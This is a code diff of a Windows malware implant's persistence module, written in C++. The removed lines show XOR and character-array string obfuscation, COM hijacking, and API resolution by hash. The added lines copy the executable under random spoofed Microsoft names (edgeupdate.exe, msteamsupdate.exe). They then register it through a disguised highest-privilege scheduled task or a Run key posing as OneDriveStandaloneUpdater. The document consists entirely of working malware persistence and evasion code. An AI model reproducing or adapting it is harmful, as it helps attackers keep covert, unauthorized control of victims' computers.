@@ -1,25 +1,10 @@
 #include "Persistence.h"
-#include "ComHijacker.h"
-#include "../evasion/Syscalls.h"
-#include "../utils/Shared.h"
 #include <windows.h>
 #include <string>
 #include <vector>
 #include <random>
-#include <rpc.h>
-#pragma comment(lib, "rpcrt4.lib")
 
 namespace persistence {
-
-namespace {
-// XOR helper
-std::string xorDecrypt(const std::string& enc, BYTE key) {
-    std::string dec = enc;
-    for (char& c : dec) c ^= key;
-    return dec;
-}
-
-}
 
 namespace {
 
@@ -45,70 +30,56 @@ std::wstring getExecutablePath() {
     return std::wstring(path_buf.begin(), path_buf.end());
 }
 
-std::wstring getPersistencePath() {
-    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
-    wchar_t expanded[MAX_PATH];
-    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
-    std::wstring userPersistPath = expanded;
-    std::wstring fileName = L"\\auth.dll";
-    return userPersistPath + fileName;
-}
-
 } // namespace
-bool isRunningFromPersistence() {
-    std::wstring sourcePath = getExecutablePath();
-    std::wstring persistPath = getPersistencePath();
-    return lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0;
-}
+
 void establishPersistence() {
     std::wstring sourcePath = getExecutablePath();
-    std::wstring persistPath = getPersistencePath();
+
+    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
+    const wchar_t* userPath = L"%LOCALAPPDATA%\\Microsoft\\Vault";
+
+    std::vector<const wchar_t*> dynamicNames = {
+        L"vaultsvc.exe", L"edgeupdate.exe", L"onedrivesync.exe", L"msteamsupdate.exe"
+    };
+
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> distrib(0, static_cast<int>(dynamicNames.size() - 1));
+    const wchar_t* persistFilename = dynamicNames[distrib(gen)];
+
+    const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
+
+    wchar_t expandedDir[MAX_PATH];
+    ExpandEnvironmentStringsW(persistDir, expandedDir, MAX_PATH);
+
+    std::wstring persistPath = std::wstring(expandedDir) + L"\\" + persistFilename;
 
     if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
         return; // Already running from persistence location
     }
 
-    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
-    wchar_t expanded[MAX_PATH];
-    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
-    CreateDirectoryW(expanded, NULL);
+    CreateDirectoryW(expandedDir, NULL);
     CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
 
-    if (!isAdmin()) {
-        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), NULL, 0, NULL, NULL);
-        std::string implantPath(size_needed, 0);
-        WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), &implantPath[0], size_needed, NULL, NULL);
-
-        GUID guid;
-        CoCreateGuid(&guid);
-        wchar_t guid_w[40];
-        StringFromGUID2(guid, guid_w, 40);
-        std::wstring clsid_w(guid_w);
-
-        //int clsid_size_needed = WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), NULL, 0, NULL, NULL);
-        //std::string clsid(clsid_size_needed, 0);
-        //WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), &clsid[0], clsid_size_needed, NULL, NULL);
-
-
-        std::string clsid = "{54E211B6-3650-4F75-8334-FA359598E1C5}"; //default CLSID || remove this line for random clsid
-
-        persistence::ComHijacker::Install(implantPath, clsid);
+    if (isAdmin()) {
+        // Use schtasks.exe to create a scheduled task
+        std::wstring command = L"schtasks /Create /TN MicrosoftEdgeUpdateTaskMachineUA /TR \"" + persistPath + L"\" /SC ONLOGON /RL HIGHEST /F";
+        STARTUPINFOW si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+        CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        // Use registry run key
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t)));
+            RegCloseKey(hKey);
+        }
     }
-
-    // Launch the newly persisted executable
-    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
-    using CreateProc = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
-    DWORD hash = djb2Hash("CreateProcessW");
-    CreateProc pCreate = (CreateProc)getProcByHash(hKernel, hash);
-
-    STARTUPINFOW si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-    pCreate(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
 }
 
 } // namespace persistence
